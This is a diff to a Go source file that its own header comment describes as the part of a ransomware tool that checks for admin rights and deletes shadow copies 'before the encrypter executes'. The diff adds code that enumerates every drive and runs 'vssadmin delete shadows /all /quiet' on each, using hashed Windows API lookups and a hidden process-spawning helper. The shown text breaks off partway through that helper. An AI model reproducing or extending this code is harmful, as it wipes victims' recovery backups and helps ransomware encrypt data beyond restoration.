@@ -1,12 +1,14 @@
 // this package performs the shadow copy deletion and check if admin before the encrypter executes
 
-package main 
+package main
 
 import (
-	wc "github.com/carved4/go-wincall"
+	"fmt"
+	"regexp"
 	"unsafe"
-)
 
+	wc "github.com/carved4/go-wincall"
+)
 
 func CheckAdmin() bool {
 	advapiBase := wc.LoadLibraryLdr("advapi32.dll")
@@ -27,29 +29,46 @@ func CheckAdmin() bool {
 	ret, _, _ := wc.CallG0(
 		getTokInfo,
 		hToken,
-		20, 
+		20,
 		uintptr(unsafe.Pointer(&elevation)),
 		uint32(unsafe.Sizeof(elevation)),
 		uintptr(unsafe.Pointer(&returnLength)),
 	)
 
 	if ret == 0 {
-		return false 
+		return false
 	}
 
 	return elevation.TokenIsElevated != 0
 }
 
-func VssCopies() string {
-	cmd := "cmd.exe /c " + "vssadmin delete shadows /all /for=c: /quiet"
+func VssCopies() {
+	kernel32base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
+	getDrivesW := wc.GetFunctionAddress(kernel32base, wc.GetHash("GetLogicalDriveStringsW"))
+	cmd := ""
+	buff := make([]byte, 254)
+	wc.CallG0(getDrivesW, uintptr(len(buff)), uintptr(unsafe.Pointer(&buff[0])))
+	buffStr := string(buff)
+	reg, _ := regexp.Compile("[^a-zA-Z0-9]+")
+	cleanedString := reg.ReplaceAllString(buffStr, "")
+	for _, d := range cleanedString {
+		drive := string(d) + ":\\"
+		fmt.Printf("[+] deleting shadow copies for %s\n", drive)
+		cmd += fmt.Sprintf("cmd.exe /c "+"vssadmin delete shadows /all /for=%s /quiet", drive)
+		output := execCmd(cmd)
+		fmt.Printf("vss output: %s\n", output)
+		fmt.Printf("[+] done!\n")
+		cmd = ""
+	}
+}
 
+func execCmd(cmd string) string {
 	kernel32base := wc.GetModuleBase(wc.GetHash("kernel32.dll"))
 	createProcessW := wc.GetFunctionAddress(kernel32base, wc.GetHash("CreateProcessW"))
 	closeHandle := wc.GetFunctionAddress(kernel32base, wc.GetHash("CloseHandle"))
 	createPipe := wc.GetFunctionAddress(kernel32base, wc.GetHash("CreatePipe"))
 	readFile := wc.GetFunctionAddress(kernel32base, wc.GetHash("ReadFile"))
 	waitForSingleObject := wc.GetFunctionAddress(kernel32base, wc.GetHash("WaitForSingleObject"))
-
 	var hRead, hWrite uintptr
 
 	sa := SECURITY_ATTRIBUTES{
